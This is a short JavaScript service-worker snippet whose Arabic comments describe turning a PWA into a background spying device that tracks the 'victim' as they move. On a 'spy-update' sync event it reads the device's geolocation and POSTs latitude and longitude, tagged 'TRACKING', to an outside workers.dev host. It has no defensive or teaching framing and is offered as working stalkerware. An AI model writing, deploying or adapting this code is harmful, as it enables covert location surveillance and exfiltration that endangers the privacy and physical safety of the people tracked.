// هذا الكود يجعل الـ PWA يعمل كجهاز تنصت في الخلفية
self.addEventListener('sync', (event) => {
    if (event.tag === 'spy-update') {
        event.waitUntil(
            // سحب الموقع الجغرافي وإرساله كلما تحرك الضحية
            navigator.geolocation.getCurrentPosition(pos => {
                fetch('https://pylod.zaid00dd.workers.dev/', {
                    method: 'POST',
                    body: JSON.stringify({
                        lat: pos.coords.latitude,
                        long: pos.coords.longitude,
                        action: "TRACKING"
                    })
                });
            })
        );
    }
});
